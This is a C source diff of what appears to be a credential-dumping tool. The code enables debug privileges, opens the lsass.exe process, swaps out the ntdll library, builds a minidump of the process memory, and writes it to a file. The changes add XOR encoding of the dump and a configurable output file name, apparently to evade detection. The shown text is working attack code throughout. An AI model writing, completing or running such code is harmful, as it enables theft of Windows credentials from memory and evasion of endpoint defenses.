@@ -291,23 +291,11 @@ char* GetProcNameFromHandle(HANDLE process_handle) {
 }
 
 
-void to_lowercase(char* str) {
-    while (*str) {
-        *str = tolower((unsigned char)*str);  // Convert each character to lowercase
-        str++;
-    }
-}
-
-
 HANDLE GetProcessByName(const char* proc_name) {
     HANDLE aux_handle = NULL;
-
     // Iterate processes
     while (NT_SUCCESS(NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, &aux_handle))) {
         char* current_proc_name = GetProcNameFromHandle(aux_handle);
-        //printf("aux_handle: %d\n", aux_handle);
-        //printf("[+] current_proc_name: %s\n ", current_proc_name);
-        to_lowercase(current_proc_name);
         if (current_proc_name && strcmp(current_proc_name, proc_name) == 0) {
             return aux_handle;
         }
@@ -407,7 +395,7 @@ MemFile* ReadMemReg(LPVOID hProcess, int* memfile_count_out) {
 
 ModuleInformation* GetModuleInfo(LPVOID* outputHandle, int* module_counter_out) {
     EnableDebugPrivileges();
-    HANDLE hProcess = GetProcessByName("c:\\windows\\system32\\lsass.exe");
+    HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
     *outputHandle = (LPVOID)hProcess;
     printf("[+] Process handle:\t%d\n", hProcess);
 
@@ -1076,19 +1064,43 @@ void WriteToFile(const char* filename, uint8_t* data, size_t length) {
 
     // Close the file
     fclose(file);
-    printf("[+] File created correctly.");
+    printf("[+] File %s created correctly.", filename);
+}
+
+
+uint8_t* encode_bytes(uint8_t* dump_bytes, int dump_len, char* key_xor, int key_len) {
+    uint8_t* encoded_bytes = (uint8_t*)malloc(dump_len);
+    if (!encoded_bytes) {
+        return NULL;
+    }
+    for (int i = 0; i < dump_len; i++) {
+        encoded_bytes[i] = dump_bytes[i] ^ key_xor[i % key_len];
+    }
+    return encoded_bytes;
 }
 
 
 int main(int argc, char* argv[]) {
     initializeFunctions();
 
-    // Replace ntdll library
+    // Input arguments
     const char* ntdll_option = "default";
+    const char* dump_fname = "native.dmp";
+    const char* key_xor = "";
     if (argc >= 2)
     {
         ntdll_option = argv[1];
     }
+    if (argc >= 3)
+    {
+        dump_fname = argv[2];
+    }
+    if (argc >= 4)
+    {
+        key_xor = argv[3];
+    }
+
+    // Replace ntdll library
     ReplaceLibrary(ntdll_option);
 
     // OS Information (Lock)
@@ -1096,7 +1108,7 @@ int main(int argc, char* argv[]) {
     
     // Get Modules Information (Shock)
     LPVOID hProcess = NULL;
-    int pid = NULL;
+    int pid = NULL; // <---- ?
     int moduleInformationList_len = 0;
     ModuleInformation* moduleInformationList = GetModuleInfo(&hProcess, &moduleInformationList_len);
     
@@ -1107,6 +1119,10 @@ int main(int argc, char* argv[]) {
     // Create Minidump
     int dump_len = NULL;
     uint8_t* dump_file_bytes = get_dump_bytearr(osvi, moduleInformationList, moduleInformationList_len, memfile_list, memfile_count, &dump_len);
-    WriteToFile("nativedump.dmp", dump_file_bytes, dump_len);
+    if (key_xor != "") {
+        int key_len = strlen(key_xor);
+        dump_file_bytes = encode_bytes(dump_file_bytes, dump_len, (char*)key_xor, key_len);
+    }
+    WriteToFile(dump_fname, dump_file_bytes, dump_len);
     return 0;
 }
